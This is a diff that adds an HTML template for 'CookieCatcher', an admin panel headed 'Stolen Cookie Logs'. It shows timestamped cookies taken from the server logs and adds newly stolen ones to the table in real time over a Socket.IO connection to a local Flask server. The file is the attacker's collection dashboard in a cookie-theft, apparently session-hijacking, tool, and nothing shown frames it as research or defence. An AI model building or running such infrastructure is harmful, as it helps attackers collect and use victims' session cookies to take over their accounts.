@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - CookieCatcher</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            color: #4CAF50;
+        }
+        table {
+            width: 80%;
+            margin: 0 auto;
+            border-collapse: collapse;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 8px;
+            text-align: center;
+        }
+        th {
+            background-color: #4CAF50;
+            color: white;
+        }
+        td {
+            background-color: #f9f9f9;
+        }
+        .container {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Stolen Cookie Logs</h1>
+    
+    <div class="container">
+        <table id="cookie-table">
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>Cookie</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for log in logs %}
+                    <tr>
+                        <td>{{ log.split(' - ')[0] }}</td>
+                        <td>{{ log.split(' - ')[1] }}</td>
+                    </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Include SocketIO JS Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.0/socket.io.min.js"></script>
+    <script>
+        var socket = io.connect('http://localhost:5000');
+
+        
+        // Listen for the new_cookie event from Flask
+        socket.on('cookie', function(data) {
+            var table = document.getElementById('cookie-table').getElementsByTagName('tbody')[0];
+            var newRow = table.insertRow();
+            var timestampCell = newRow.insertCell(0);
+            var cookieCell = newRow.insertCell(1);
+            timestampCell.textContent = data.timestamp;
+            cookieCell.textContent = data.cookie;
+        });
+        socket.on('connect', function() {
+            console.log("Socket connected!");
+        });
+
+        socket.on('disconnect', function() {
+            console.log("Socket disconnected.");
+        });
+
+    </script>
+</body>
+</html>
